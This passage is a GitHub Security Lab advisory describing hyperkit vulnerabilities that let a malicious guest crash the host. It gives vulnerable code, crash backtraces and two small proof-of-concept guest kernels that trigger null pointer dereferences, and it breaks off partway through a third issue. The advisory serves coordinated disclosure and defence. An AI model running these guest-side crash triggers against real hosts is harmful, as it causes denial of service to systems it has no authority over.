<!DOCTYPE html>
<html lang="en">

<head>
    <!-- META DATA -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="preload" href="/assets/css/index.css" as="style">
    <link rel="preload" href="/assets/js/main.js" as="script">
    <!--[if IE]><meta http-equiv="cleartype" content="on" /><![endif]-->
    <link rel="canonical" href="https://securitylab.github.com/advisories/GHSL-2021-054_057-moby-hyperkit/">
    <link rel="alternate" type="application/rss+xml" title="GitHub Security Lab" href="/feed.xml">
    <link rel="stylesheet" media="screen" href="/assets/css/index.css" />
    <script async src="https://js.maxmind.com/js/apis/geoip2/v2.1/geoip2.js"></script>
    <script src="/assets/js/jquery.js"></script>
    <link id="favicon" rel="shortcut icon" type="image/ico" href="/assets/img/favicons/favicon.png" />
    <link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" />
    <link rel="icon" href="/assets/img/favicons/android-favicon.png">
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>GHSL-2021-054_057: Code execution outside the virtualized guest in hyperkit - CVE-2021-32843, CVE-2021-32844, CVE-2021-32845, CVE-2021-32846 | GitHub Security Lab</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="GHSL-2021-054_057: Code execution outside the virtualized guest in hyperkit - CVE-2021-32843, CVE-2021-32844, CVE-2021-32845, CVE-2021-32846" />
<meta name="author" content="agustingianni" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="A malicious guest can trigger vulnerabilities in the host by abusing certain drivers that may lead to code execution outside the virtualized guest." />
<meta property="og:description" content="A malicious guest can trigger vulnerabilities in the host by abusing certain drivers that may lead to code execution outside the virtualized guest." />
<link rel="canonical" href="https://securitylab.github.com/advisories/GHSL-2021-054_057-moby-hyperkit/" />
<meta property="og:url" content="https://securitylab.github.com/advisories/GHSL-2021-054_057-moby-hyperkit/" />
<meta property="og:site_name" content="GitHub Security Lab" />
<meta property="og:image" content="https://securitylab.github.com/assets/img/social-card.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-10-05T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://securitylab.github.com/assets/img/social-card.png" />
<meta property="twitter:title" content="GHSL-2021-054_057: Code execution outside the virtualized guest in hyperkit - CVE-2021-32843, CVE-2021-32844, CVE-2021-32845, CVE-2021-32846" />
<meta name="twitter:site" content="@GHSecurityLab" />
<meta name="twitter:creator" content="@agustingianni" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"agustingianni"},"dateModified":"2021-10-05T00:00:00+00:00","datePublished":"2021-10-05T00:00:00+00:00","description":"A malicious guest can trigger vulnerabilities in the host by abusing certain drivers that may lead to code execution outside the virtualized guest.","headline":"GHSL-2021-054_057: Code execution outside the virtualized guest in hyperkit - CVE-2021-32843, CVE-2021-32844, CVE-2021-32845, CVE-2021-32846","image":"https://securitylab.github.com/assets/img/social-card.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://securitylab.github.com/advisories/GHSL-2021-054_057-moby-hyperkit/"},"url":"https://securitylab.github.com/advisories/GHSL-2021-054_057-moby-hyperkit/"}</script>
<!-- End Jekyll SEO tag -->

    
    <meta name="ha-url" content="https://collector.githubapp.com/securitylab-website/collect">
    <script src="https://analytics.githubassets.com/hydro-marketing.min.js"></script>
</head>
  


<body class="no-js page-/advisories/GHSL-2021-054_057-moby-hyperkit page-blog">
  <a class="skip-to-content" href="#content">skip to content</a>

  <div
  id="site-navigation-container"
  class="site-navigation-container position-fixed top-0 width-full color-bg-transparent"
>
  <div
    className="position-relative site-navigation-container--background hide-sm hide-md"
  >
    <nav class="site-navigation nav d-block">
      <div
        class="container-xl py-2 d-none d-lg-flex flex-items-center flex-justify-between gap-0"
      >
        <a
          role="tab"
          title="Github"
          class="nav-logo"
          href="https://github.com"
          target="_blank"
        >
          <svg
            aria-hidden="true"
            role="img"
            class="nav-back-arrow position-absolute"
            viewBox="0 0 24 24"
            width="32"
            height="32"
            fill="currentColor"
            style="
              display: inline-block;
              user-select: none;
              vertical-align: text-bottom;
              overflow: visible;
            "
          >
            <path
              fill-rule="evenodd"
              d="M15.28 5.22a.75.75 0 00-1.06 0l-6.25 6.25a.75.75 0 000 1.06l6.25 6.25a.75.75 0 101.06-1.06L9.56 12l5.72-5.72a.75.75 0 000-1.06z"
            ></path>
          </svg>
          <svg
            height="32"
            class="octicon octicon-mark-github mr-2"
            viewBox="0 0 16 16"
            version="1.1"
            width="32"
            aria-hidden="true"
          >
            <path
              fill-rule="evenodd"
              d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"
            ></path>
          </svg>
        </a>
        <span class="Slash-item"> / </span>
        <a
          aria-current="page"
          role="tab"
          title="Security Lab"
          class="nav-item nav-item--logo"
          href="/"
          >Security Lab</a
        >

        <div
          class="nav-body flex-auto flex-justify-start hide-sm hide-md"
          role="tablist"
        >
          <a
            role="tab"
            title="Research"
            class="nav-item"
            href="https://github.blog/tag/github-security-lab/"
            target="_blank"
            >Research</a
          >
          <a
            role="tab"
            title="Advisories"
            class="nav-item"
            href="/advisories/"
            >Advisories</a
          >
          <a
            role="tab"
            title="CodeQL Wall of Fame"
            class="nav-item"
            href="/codeql-wall-of-fame/"
            >CodeQL Wall of Fame</a
          >
          <button
            aria-label="Menu"
            aria-expanded="false"
            class="nav-item nav-item-button js-dropdown-menu-trigger"
          >
            Resources
          </button>
          <a
            role="tab"
            title="Events"
            class="nav-item"
            href="/events/"
            >Events</a
          >
        </div>

        <a
          href="/get-involved/"
          class="btn-get-involved hide-sm hide-md"
          ><span>Get Involved</span></a
        >
      </div>
    </nav>
  </div>

  <div
    class="navigation-dropdown left-0 width-full position-absolute color-bg-dark py-6"
  >
    <ul class="container-xl py-5 site-navigation__dropdown">
      <li class="pb-4 dropdown-title col-4">Resources</li>
      <li class="dropdown-nav-item col-4 py-2">
        <a
          role="tab"
          title="Home"
          class=" "
          href="/open-source"
          >Open Source Community</a
        >
      </li>
      <li class="dropdown-nav-item col-4 py-2">
        <a
          role="tab"
          title="Home"
          class=""
          href="/enterprise"
          >Enterprise</a
        >
      </li>
    </ul>
  </div>
</div>

<div
  class="mobile-navbar hide-lg hide-xl d-flex flex-items-center flex-justify-start"
>
  <a
    role="tab"
    title="Github"
    class="nav-logo"
    href="https://github.com"
    target="_blank"
  >
    <svg
      height="32"
      class="octicon octicon-mark-github mr-2"
      viewBox="0 0 16 16"
      version="1.1"
      width="32"
      aria-hidden="true"
    >
      <path
        fill-rule="evenodd"
        d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"
      ></path>
    </svg>
  </a>
  <span class="Slash-item"> / </span>
  <a
    aria-current="page"
    role="tab"
    title="Security Lab"
    class="top-nav-item nav-item nav-item--logo"
    href="/"
    >Security Lab</a
  >
  <button
    aria-label="Menu"
    aria-expanded="false"
    class="sc-VigVT sc-jzJRlG nav-dropdown js-menu-trigger"
  >
    <svg
      class="caret-button"
      width="14"
      height="9"
      viewBox="0 0 14 9"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        fill-rule="evenodd"
        clip-rule="evenodd"
        d="M13.7803 0.71967C14.0732 1.01256 14.0732 1.48744 13.7803 1.78033L7.53033 8.03033C7.23744 8.32322 6.76256 8.32322 6.46967 8.03033L0.21967 1.78033C-0.0732231 1.48744 -0.0732231 1.01256 0.21967 0.71967C0.512563 0.426777 0.987437 0.426777 1.28033 0.71967L7 6.43934L12.7197 0.71967C13.0126 0.426777 13.4874 0.426777 13.7803 0.71967Z"
        fill="#24292F"
      />
    </svg>
  </button>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const toggleNavBtn = document.querySelector(".nav-dropdown");
      const mobileNav = document.querySelector(".mobile-nav");
      const caretIcon = document.querySelector(".caret-button");
      const backdrop = document.querySelector(".mobile-nav-screen");
      function toggleNavigation(event) {
        event.preventDefault();
        const expanded = toggleNavBtn.getAttribute("aria-expanded") === "true";

        toggleNavBtn.setAttribute("aria-expanded", !expanded);
        mobileNav.classList.toggle("expanded", !expanded);
        backdrop.classList.toggle("active", !expanded);

      }
      toggleNavBtn.addEventListener("click", toggleNavigation);
      toggleNavBtn.addEventListener("touchstart", toggleNavigation);

      backdrop.addEventListener("click", toggleNavigation);
      backdrop.addEventListener("touchstart", toggleNavigation);
    });
  </script>
</div>

<div class="mobile-nav">
  <div class="">
    <a
      role="tab"
      title="Research"
      class="nav-item "
      href="https://github.blog/tag/github-security-lab/"
      >Research</a
    >
    <a
      role="tab"
      title="Advisories"
      class="nav-item "
      href="/advisories/"
      >Advisories</a
    >
    <a
      role="tab"
      title="CodeQL Wall of Fame"
      class="nav-item "
      href="/codeql-wall-of-fame/"
      >CodeQL Wall of Fame</a
    >
    <div class="nav-item resources">
      <div
        class="nav-dropdown-item d-flex flex-justify-between flex-items-center"
      >
        <span>Resources</span>
        <svg
          class="mobile-caret"
          width="12"
          height="7"
          viewBox="0 0 12 7"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M11.6502 0.266554C11.8943 0.510632 11.8943 0.90636 11.6502 1.15044L6.44186 6.35877C6.19778 6.60285 5.80205 6.60285 5.55798 6.35877L0.349644 1.15044C0.105566 0.90636 0.105566 0.510632 0.349644 0.266554C0.593721 0.0224767 0.98945 0.0224767 1.23353 0.266554L5.99992 5.03295L10.7663 0.266554C11.0104 0.0224767 11.4061 0.0224767 11.6502 0.266554Z"
            fill="white"
          />
        </svg>
      </div>

      <div class="sub-menu">
        <a
          role="tab"
          title="Open Source Community"
          class="nav-inner-item "
          href="/open-source"
          >Open Source Community</a
        >
        <a
          role="tab"
          title="Enterprise"
          class="nav-inner-item "
          href="/enterprise"
          >Enterprise</a
        >
      </div>
    </div>
    <a
      role="tab"
      title="Events"
      class="nav-item "
      href="/events/"
      >Events</a
    >
    <a
      role="tab"
      title="Events"
      class="nav-item "
      href="/get-involved/"
      >Get Involved</a
    >
  </div>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const resources = document.querySelector(".nav-item.resources");
      const caret = resources.querySelector(".mobile-caret");
      const subMenu = resources.querySelector(".sub-menu");

      resources.addEventListener("click", function () {
        resources.classList.toggle("active");

        if (resources.classList.contains("active")) {
          // Force reflow
          subMenu.style.maxHeight = subMenu.scrollHeight + "px";
          subMenu.style.opacity = 1;
        } else {
          // Force reflow
          subMenu.style.maxHeight = "0";
          subMenu.style.opacity = 0;
        }
      });
    });
  </script>
</div>
<span class="mobile-nav-screen js-menu-trigger"></span>

<span class="dropdown-nav-screen js-dropdown-menu-trigger"></span>


  <div class="container-xl post-container p-responsive mt-md-76">
    <header class="post-header ">
      <div class="date text-mono mb-3 mb-md-2">October 5, 2021</div>
      <h1 class="page-title mb-3 mb-md-4 ">GHSL-2021-054_057: Code execution outside the virtualized guest in hyperkit - CVE-2021-32843, CVE-2021-32844, CVE-2021-32845, CVE-2021-32846</h1>

      
      
      
      
      

      

      <a target="_blank" class="mx-auto sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/agustingianni">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/102623" alt="Author avatar" height="35" width="35">
        <span>Agustin Gianni</span>
      </a>
    </header>

    <main id="content" class="markdown-body post-content" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2021-03-30: Reported the vulnerabilities to security@docker.com</li>
  <li>2021-03-31: Maintainers acknowledged the receipt of the report</li>
  <li>2021-06-24: Maintainers fixed the issues</li>
</ul>

<h2 id="summary">Summary</h2>

<p>A malicious guest can trigger vulnerabilities in the host by abusing certain drivers that may lead to code execution outside the virtualized guest.</p>

<h2 id="product">Product</h2>

<p>hyperkit</p>

<h2 id="tested-version">Tested Version</h2>

<p>v0.20210107</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-vi_pci_read-null-vc_cfgread-function-pointer-dereference-ghsl-2021-054">Issue 1: vi_pci_read null vc_cfgread function pointer dereference (GHSL-2021-054)</h3>

<p>Virtualized devices implement a <code class="language-plaintext highlighter-rouge">struct virtio_consts</code> that contains handlers and other components that will be used by the device. The function pointer <code class="language-plaintext highlighter-rouge">vc_cfgread</code> is used to read the <code class="language-plaintext highlighter-rouge">virtio</code> configuration of a device which is an operation that the <code class="language-plaintext highlighter-rouge">guest</code> performs to initialize the <code class="language-plaintext highlighter-rouge">virtio</code> drivers.</p>

<p>Not every device implements all the available operations, therefore calls to <code class="language-plaintext highlighter-rouge">virtio</code> handlers must be checked for <code class="language-plaintext highlighter-rouge">null</code>. One such device is <code class="language-plaintext highlighter-rouge">vtrnd</code> which is used to supply randomness to the guest:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">struct</span> <span class="n">virtio_consts</span> <span class="n">vtrnd_vi_consts</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"vtrnd"</span><span class="p">,</span>		    <span class="cm">/* our name */</span>
    <span class="mi">1</span><span class="p">,</span>			        <span class="cm">/* we support 1 virtqueue */</span>
    <span class="mi">0</span><span class="p">,</span>			        <span class="cm">/* config reg size */</span>
    <span class="n">pci_vtrnd_reset</span><span class="p">,</span>	<span class="cm">/* reset */</span>
    <span class="n">pci_vtrnd_notify</span><span class="p">,</span>	<span class="cm">/* device-wide qnotify */</span>
    <span class="nb">NULL</span><span class="p">,</span>			    <span class="cm">/* read virtio config */</span>
    <span class="nb">NULL</span><span class="p">,</span>			    <span class="cm">/* write virtio config */</span>
    <span class="nb">NULL</span><span class="p">,</span>			    <span class="cm">/* apply negotiated features */</span>
    <span class="mi">0</span><span class="p">,</span>			        <span class="cm">/* our capabilities */</span>
<span class="p">};</span>
</code></pre></div></div>

<p>In <a href="https://github.com/moby/hyperkit/blob/2f061e447e1435cdf1b9eda364cea6414f2c606b/src/lib/virtio.c#L562">virtio.c</a> there is a call to <code class="language-plaintext highlighter-rouge">vc_cfgread</code> that does not check for <code class="language-plaintext highlighter-rouge">null</code> which when called makes the host crash.</p>

<p><em>Vulnerable call:</em></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">virtio_config_size</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/*
     * Subtract off the standard size (including MSI-X
     * registers if enabled) and dispatch to underlying driver.
     * If that fails, fall into general code.
     */</span>
    <span class="n">newoff</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="n">virtio_config_size</span><span class="p">);</span>
    <span class="n">max</span> <span class="o">=</span> <span class="n">vc</span><span class="o">-&gt;</span><span class="n">vc_cfgsize</span> <span class="o">?</span> <span class="n">vc</span><span class="o">-&gt;</span><span class="n">vc_cfgsize</span> <span class="o">:</span> <span class="mh">0x100000000</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">newoff</span> <span class="o">+</span> <span class="p">((</span><span class="kt">unsigned</span><span class="p">)</span> <span class="n">size</span><span class="p">))</span> <span class="o">&gt;</span> <span class="n">max</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">bad</span><span class="p">;</span>
    <span class="n">error</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">vc</span><span class="o">-&gt;</span><span class="n">vc_cfgread</span><span class="p">)(</span><span class="n">DEV_SOFTC</span><span class="p">(</span><span class="n">vs</span><span class="p">),</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span> <span class="n">newoff</span><span class="p">),</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">error</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><em>Host crashing:</em></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Stop reason: EXC_BAD_ACCESS (code=1, address=0x0)

* thread #4, name = 'vcpu:0', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
  * frame #0: 0x0000000000000000
    frame #1: 0x00000001001098d0 hyperkit`vi_pci_read(vcpu=0, pi=0x0000616000000f80, baridx=0, offset=20, size=1) at virtio.c:562:11 [opt]
    frame #2: 0x00000001000bf4c2 hyperkit`pci_emul_io_handler(vcpu=0, in=1, port=8468, bytes=1, eax=0x000070000f7aabc0, arg=0x0000616000000f80) at pci_emul.c:361:22 [opt]
    frame #3: 0x000000010009a90b hyperkit`emulate_inout(vcpu=0, vmexit=0x0000000100399620, strict=0) at inout.c:243:12 [opt]
    frame #4: 0x000000010011740c hyperkit`vmexit_inout(vme=0x0000000100399620, pvcpu=0x000070000f7aae00) at hyperkit.c:353:10 [opt]
    frame #5: 0x000000010011a311 hyperkit`vcpu_loop(vcpu=0, startrip=1052672) at hyperkit.c:631:22 [opt]
    frame #6: 0x000000010011953d hyperkit`vcpu_thread(param=0x0000000100399220) at hyperkit.c:278:2 [opt]
    frame #7: 0x00007fff2031d950 libsystem_pthread.dylib`_pthread_start + 224
    frame #8: 0x00007fff2031947b libsystem_pthread.dylib`thread_start + 15
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue may lead to a guest crashing the host causing a <code class="language-plaintext highlighter-rouge">denial of service</code>.</p>

<h4 id="proof-of-concept">Proof of Concept</h4>

<p>The following <code class="language-plaintext highlighter-rouge">PoC</code> is a simple multiboot kernel that simulates a compromised guest. The guest must be booted with the device <code class="language-plaintext highlighter-rouge">vtrnd</code> enabled by passing <code class="language-plaintext highlighter-rouge">hyperkit</code> the command line flags <code class="language-plaintext highlighter-rouge">-s 5,virtio-rnd</code> for example.</p>

<p>In order to compile it follow the instructions in the <code class="language-plaintext highlighter-rouge">resources</code> section.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">inb</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">port</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="n">__asm__</span> <span class="n">__volatile__</span><span class="p">(</span><span class="s">"inb %1,%0"</span>
                         <span class="o">:</span> <span class="s">"=a"</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
                         <span class="o">:</span> <span class="s">"Nd"</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">kernel_main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">inb</span><span class="p">(</span><span class="mh">0x2114</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="issue-2-vi_pci_write-null-vc_cfgwrite-function-pointer-dereference-ghsl-2021-055">Issue 2: vi_pci_write null vc_cfgwrite function pointer dereference (GHSL-2021-055)</h3>

<p>This issue is similar to <code class="language-plaintext highlighter-rouge">issue 1</code> but it involves the <code class="language-plaintext highlighter-rouge">vc_cfgwrite</code> function pointer which is called in the same way by <a href="https://github.com/moby/hyperkit/blob/2f061e447e1435cdf1b9eda364cea6414f2c606b/src/lib/virtio.c#L681">vi_pci_write</a>. Again, the device <code class="language-plaintext highlighter-rouge">vtrnd</code> has no implementation of this function therefore when it is called the host crashes.</p>

<p><em>Vulnerable call:</em></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">virtio_config_size</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/*
     * Subtract off the standard size (including MSI-X
     * registers if enabled) and dispatch to underlying driver.
     */</span>
    <span class="n">newoff</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="n">virtio_config_size</span><span class="p">);</span>
    <span class="n">max</span> <span class="o">=</span> <span class="n">vc</span><span class="o">-&gt;</span><span class="n">vc_cfgsize</span> <span class="o">?</span> <span class="n">vc</span><span class="o">-&gt;</span><span class="n">vc_cfgsize</span> <span class="o">:</span> <span class="mh">0x100000000</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">newoff</span> <span class="o">+</span> <span class="p">((</span><span class="kt">unsigned</span><span class="p">)</span> <span class="n">size</span><span class="p">))</span> <span class="o">&gt;</span> <span class="n">max</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">bad</span><span class="p">;</span>
    <span class="n">error</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">vc</span><span class="o">-&gt;</span><span class="n">vc_cfgwrite</span><span class="p">)(</span><span class="n">DEV_SOFTC</span><span class="p">(</span><span class="n">vs</span><span class="p">),</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span> <span class="n">newoff</span><span class="p">),</span> <span class="n">size</span><span class="p">,</span>
        <span class="p">((</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="n">value</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">error</span><span class="p">)</span>
        <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p><em>Host crashing:</em></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Stop reason: EXC_BAD_ACCESS (code=1, address=0x0)

* thread #6, name = 'vcpu:0', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
  * frame #0: 0x0000000000000000
    frame #1: 0x0000000100041866 hyperkit`vi_pci_write(vcpu=0, pi=0x0000616000000f80, baridx=0, offset=20, size=2, value=51966) at virtio.c:681:11 [opt]
    frame #2: 0x0000000100029c22 hyperkit`pci_emul_io_handler(vcpu=0, in=0, port=8468, bytes=2, eax=0x000070000a59ae84, arg=0x0000616000000f80) at pci_emul.c:364:5 [opt]
    frame #3: 0x000000010001eaf0 hyperkit`emulate_inout(vcpu=0, vmexit=0x000000010025a7d0, strict=0) at inout.c:243:12 [opt]
    frame #4: 0x00000001000452cd hyperkit`vmexit_inout(vme=0x000000010025a7d0, pvcpu=0x000070000a59af5c) at hyperkit.c:353:10 [opt]
    frame #5: 0x00000001000451ac hyperkit`vcpu_loop(vcpu=0, startrip=1052672) at hyperkit.c:631:22 [opt]
    frame #6: 0x0000000100044d5d hyperkit`vcpu_thread(param=0x000000010025a3d0) at hyperkit.c:278:2 [opt]
    frame #7: 0x00007fff2048b950 libsystem_pthread.dylib`_pthread_start + 224
    frame #8: 0x00007fff2048747b libsystem_pthread.dylib`thread_start + 15

</code></pre></div></div>

<h4 id="impact-1">Impact</h4>

<p>This issue may lead to a guest crashing the host causing a <code class="language-plaintext highlighter-rouge">denial of service</code>.</p>

<h4 id="proof-of-concept-1">Proof of Concept</h4>

<p>The following <code class="language-plaintext highlighter-rouge">PoC</code> is a simple multiboot kernel that simulates a compromised guest. The guest must be booted with the device <code class="language-plaintext highlighter-rouge">vtrnd</code> enabled by passing <code class="language-plaintext highlighter-rouge">hyperkit</code> the command line flags <code class="language-plaintext highlighter-rouge">-s 5,virtio-rnd</code> for example.</p>

<p>In order to compile it follow the instructions in the <code class="language-plaintext highlighter-rouge">resources</code> section.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">outw</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">port</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm__</span> <span class="n">__volatile__</span><span class="p">(</span><span class="s">"outw %w0,%w1"</span>
                         <span class="o">:</span>
                         <span class="o">:</span> <span class="s">"a"</span><span class="p">(</span><span class="n">value</span><span class="p">),</span> <span class="s">"Nd"</span><span class="p">(</span><span class="n">port</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">kernel_main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">outw</span><span class="p">(</span><span class="mh">0x2114</span><span class="p">,</span> <span class="mh">0xcafe</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="issue-3-vtrnd-pci_vtrnd_notify-uninitialized-memory-use-ghsl-2021-056">Issue 3: vtrnd pci_vtrnd_notify uninitialized memory use (GHSL-2021-056)</h3>

<p><code class="language-plaintext highlighter-rouge">vtrnd</code> is an implementation of Virtio RNG, a paravirtualized device that is exposed as a hardware RNG device to the guest. The randomness values are transferred into the guest memory by reading <code class="language-plaintext highlighter-rouge">queues</code> defined by the guest by using <code class="language-plaintext highlighter-rouge">vq_getchain</code> to fill a <code class="language-plaintext highlighter-rouge">struct iovec</code> structure with the memory ranges specified by the guest.</p>

<p>When there is an error condition, the function <code class="language-plaintext highlighter-rouge">vq_getchain</code> returns <code class="language-plaintext highlighter-rouge">-1</code> if there was an error, <code class="language-plaintext highlighter-rouge">0</code> if there was no work to be done, or an integer bigger than <code class="language-plaintext highlighter-rouge">0</code> signaling the number of descriptors it was able to read into the <code class="language-plaintext highlighter-rouge">iovec</code> structure. In all cases, it is important to check for errors <em>and</em> if the amount of descriptors requested matches the amount read.</p>

<p>Unfortunately the implementation of <code class="language-plaintext highlighter-rouge">qnotify</code> at <a href="https://github.com/moby/hyperkit/blob/2f061e447e1435cdf1b9eda364cea6414f2c606b/src/lib/pci_virtio_rnd.c#L98">pci_vtrnd_notify</a>, fails to check the return value of <code class="language-plaintext highlighter-rouge">vq_getchain</code>. This leads to <code class="language-plaintext highlighter-rouge">struct iovec iov;</code> being uninitialized and used to read memory in <code class="language-plaintext highlighter-rouge">len = (int) read(sc-&gt;vrsc_fd, iov.iov_base, iov.iov_len);</code> when an attacker is able to make <code class="language-plaintext highlighter-rouge">vq_getchain</code> fail.</p>

<p>Making <code class="language-plaintext highlighter-rouge">vq_getchain</code> fail is trivial since by definition it deals with <code class="language-plaintext highlighter-rouge">virtio</code> queues that are created by the guest operating system. The simplest way to make this function not initialize the <code class="language-plaintext highlighter-rouge">iovec</code> structure is by simply not creating any <code class="language-plaintext highlighter-rouge">virtio</code> queues for it to read.</p>

<p><em>Vulnerable function:</em></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span>
<span class="nf">pci_vtrnd_notify</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">vsc</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vqueue_info</span> <span class="o">*</span><span class="n">vq</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">pci_vtrnd_softc</span> <span class="o">*</span><span class="n">sc</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
	<span class="kt">uint16_t</span> <span class="n">idx</span><span class="p">;</span>

	<span class="n">sc</span> <span class="o">=</span> <span class="n">vsc</span><span class="p">;</span>

